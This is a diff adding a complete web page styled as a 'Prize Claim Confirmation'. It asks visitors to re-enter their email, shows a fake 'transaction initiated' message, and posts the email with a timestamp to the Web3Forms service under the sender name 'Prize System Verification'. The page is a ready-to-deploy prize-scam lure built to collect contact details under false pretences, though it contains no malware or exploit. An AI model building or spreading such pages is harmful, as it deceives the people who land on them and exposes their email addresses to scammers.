@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm Your Prize</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 350px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+
+        p.instructions {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+            color: #555;
+            font-size: 14px;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 5px rgba(52, 152, 219, 0.3);
+        }
+
+        button#confirmBtn {
+            background-color: #3498db; /* Default Blue */
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        /* This class will be applied via JavaScript after clicking */
+        button#confirmBtn.success-state {
+            background-color: #27ae60; /* Changes to Green */
+            cursor: not-allowed;
+        }
+
+        #statusMessage {
+            margin-top: 20px;
+            font-weight: bold;
+            font-size: 16px;
+            color: #27ae60;
+            min-height: 24px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Prize Claim Confirmation</h2>
+    <p class="instructions">Please re-enter your email address to confirm your transaction details.</p>
+
+    <form id="confirmForm">
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="you@example.com" required>
+        </div>
+
+        <button type="submit" id="confirmBtn">Confirm</button>
+    </form>
+
+    <p id="statusMessage"></p>
+</div>
+
+<script>
+    const confirmForm = document.getElementById('confirmForm');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const statusMessage = document.getElementById('statusMessage');
+
+    confirmForm.addEventListener('submit', function(event) {
+        event.preventDefault(); // Stop page reload
+
+        // 1. Immediately change button appearance and disable it
+        confirmBtn.disabled = true;
+        confirmBtn.classList.add('success-state');
+        confirmBtn.textContent = "Confirmed";
+
+        // 2. Display the transaction status text
+        statusMessage.textContent = "transaction initiated ";
+
+        // 3. Grab data and generate the precise local timestamp
+        const userEmail = document.getElementById('email').value;
+        const currentTimestamp = new Date().toLocaleString(); // Captures the exact click time
+
+        // 4. Send payload to Web3Forms API
+        const formEndpoint = "https://api.web3forms.com/submit"; 
+        const payload = {
+            access_key: "", // <--- PASTE YOUR SAME ACCESS KEY HERE
+            subject: "Prize Claim Confirmed!",
+            from_name: "Prize System Verification",
+            user_email: userEmail,
+            confirmation_time: currentTimestamp
+        };
+
+        fetch(formEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(payload),
+        })
+        .then(response => response.json())
+        .then(result => {
+            if (result.success) {
+                console.log("Confirmation data dispatched successfully.");
+            } else {
+                console.error("Web3Forms returned an error status.");
+            }
+        })
+        .catch((error) => {
+            console.error('Network error transmitting confirmation details:', error);
+        });
+    });
+</script>
+
+</body>
+</html>
